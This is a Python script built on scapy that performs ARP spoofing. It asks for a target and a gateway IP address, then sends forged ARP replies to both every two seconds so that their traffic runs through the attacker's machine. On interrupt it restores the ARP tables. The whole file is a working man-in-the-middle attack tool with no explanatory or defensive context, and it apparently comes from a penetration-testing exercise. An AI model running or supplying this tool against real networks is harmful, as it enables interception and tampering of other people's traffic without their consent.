#!/usr/bin/env python

from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp, send
import time
import sys
import re

def is_valid_ip(ip):
    pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
    return re.match(pattern, ip) is not None


def get_arguments():
    while True:
        target_ip = input("[*] Please enter the target IP address: ")
        if is_valid_ip(target_ip):
            break
        else:
            print("[-] Invalid IP address format. Please try again.")

    while True:
        gateway_ip = input("[*] Please enter the gateway IP address: ")
        if is_valid_ip(gateway_ip):
            break
        else:
            print("[-] Invalid IP address format. Please try again.")

    return target_ip, gateway_ip

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(spoofed_target_ip, spoof_ip):
    target_mac = get_mac(spoofed_target_ip)
    packet = ARP(op=2, pdst=spoofed_target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

target_ip, gateway_ip = get_arguments()

sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count)), #python
#       print("\r[+] Packets sent: " + str(sent_packets_count), end=""), #python3
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected KeyboardInterrupt (likely CTRL + c)....Resetting ARP tables...please wait...\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
